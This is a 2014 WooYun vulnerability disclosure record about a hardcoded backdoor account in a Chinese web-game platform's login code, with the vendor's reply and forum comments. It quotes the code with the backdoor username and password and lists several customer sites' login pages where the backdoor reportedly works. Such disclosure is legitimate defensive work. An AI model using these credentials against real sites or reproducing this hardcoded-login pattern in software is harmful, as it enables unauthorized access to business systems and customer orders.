{"id": 4909, "wybug_id": "wooyun-2014-048661", "wybug_title": "信游科技页游平台程序通用型代码级后门账户(成功登录多个商业后台并可操纵订单和游戏)", "wybug_corp": "52xinyou.cn", "wybug_author": "wefgod", "wybug_date": "2014-01-12 17:52", "wybug_open_date": "2014-04-12 17:53", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "越权操作", "用户敏感信息泄露", "认证设计不合理", "代码审计", "后门账户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-12：\t细节向公众公开  简要描述： 代码级的后门账户。做网页游戏收入还可以啊…… 详细说明：  可能为测试用代码，未去掉，大部分商业用户的站点现在还可利用。而且如果是直接使用免费版的肯定是还没有改的。   漏洞证明：  先看Api/sys/login.ashx这个文件：\ncontext.Response.ContentType = \"text/plain\";        var _form_ = context.Request.Form;                var uid = _form_[\"uid\"];        var pwd = _form_[\"pwd\"];        var rem = _form_[\"rem\"];        if (uid==\"\")        {            context.Response.Write(\"请输入用户名\");            return;        }        if (pwd == \"\")        {            context.Response.Write(\"请输入密码\");            return;        }        DataManage.UserEng ueng = new DataManage.UserEng();var t = ueng.Login(uid, pwd, rem.ToLower() == \"true\");  //UserEng类的Login方法就是用来登录的\n再跟进到UserEng.Login\npublic UserLogin Login(string uid, string upwd, bool rem)        {            UserLogin result;            if (uid == \"apwmaster_D7\" && upwd == \"apwmaster_d7\")  //后门账户的用户名、密码！！！            {                IList<Apw_User> all = this.dataserver.GetAll<Apw_User>(EngSql.Ene(\"userlogin\", \"'\" + uid + \"'\"));                if (all.Count < 1)                {                    IList<Apw_User> all2 = this.dataserver.GetAll<Apw_User>(\"select * from Apw_User where u_GroupID in (select ID from SU_Group where gp_Key like '%sys_security%' and gp_Key like '%login_boss%')\");                    if (all2.Count < 1)                    {                        result = UserLogin.NoUser;                        return result;                    }                    Apw_User apw_User = all2[0];                    string strString = string.Concat(new object[]                    {                        apw_User.u_Account,                        \"$\",                        apw_User.u_RealName,                        \"$\",                        apw_User.u_Text,                        \"$\",                        apw_User.ID                    });                    string strValue = Utility.Encrypt3DES(strString, UserEng.lizablePwd);                    Utility.SetCookie(UserEng.lizableName, strValue, 3);                    result = UserLogin.OK;                    return result;                }            }\nif (uid == \"apwmaster_D7\" && upwd == \"apwmaster_d7\") 这句很明显了，根据后面的代码可以看出已经分配cookie了，所以肯定是后门账户apwmaster_D7/ apwmaster_d7测试一些官方给的案例（案例列表 http://52xinyou.cn/anli.htm )http://www.12wan.com/account/default.aspx\n\nhttp://www.ailiuwa.com/account/default.aspx\n\nhttp://www.teiyi.com/account/default.aspx\n\nhttp://www.515you.com/account/default.aspx\n\n再放几个图，搞网页游戏收入还可以啊！所以安全工作还是要做到位啊\n\n\n\n   修复方案：  删除后门账户   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-01-14 11:53 厂商回复： 已经认领  这个系统是老版本系统  公开前会被淘汰  但是非常感激提出漏洞的白帽子们  已经联系乌云官方  准备做次活动  具体请留意官方公告  再次感谢 礼物已送 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-12 19:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  ......    \n     2014-01-13 10:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 姐姐，你怎么了？    \n     2014-01-14 15:15 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  前排围观 瓜子板凳    \n     2014-01-14 17:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @阿布 打酱油路过一下    \n     2014-01-15 15:28 |    \t\t信游科技页游(乌云厂商)\t\t \n  这是源代码啊.他们技术自己发的吧.程序员是不是和公司闹变扭了.拿段测试代码就上来了.    \n     2014-01-15 16:19 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @信游科技页游 不是，源码就是您的免费包里的啊！在官网下载的啊。    \n     2014-01-15 16:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @信游科技页游 @xsser http://52xinyou.cn/%E4%BF%A1%E6%B8%B8%E5%85%8D%E8%B4%B9%E7%89%88.rar   这为什么成了他们自己技术发的了？    \n     2014-01-15 16:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @wefgod ？    \n     2014-01-15 16:56 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 没，厂商说是他们网站的技术自己发的（哥不是程序员啊），顺便拉你来围观下……看见源码很正常来的。随便反编译啊。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}